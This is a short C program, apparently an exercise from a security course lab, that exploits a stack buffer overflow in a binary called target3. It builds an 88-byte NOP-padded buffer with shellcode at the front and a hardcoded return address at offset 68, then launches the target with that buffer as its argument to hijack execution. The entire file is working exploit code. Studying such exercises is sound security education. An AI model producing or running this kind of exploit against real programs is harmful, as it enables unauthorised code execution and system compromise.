#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"

#define NOP		0x90
#define buff_len	88

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	char  	attack[buff_len];

	memset((void*)attack, NOP, buff_len);
	
	memcpy((void*)attack, (void*)shellcode, sizeof shellcode - 1);

	char ret[] = "\x10\xfe\x21\x20";
	memcpy((void*)attack+68, (void*)ret, sizeof ret);

	args[0] = TARGET;
	args[1] = attack;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
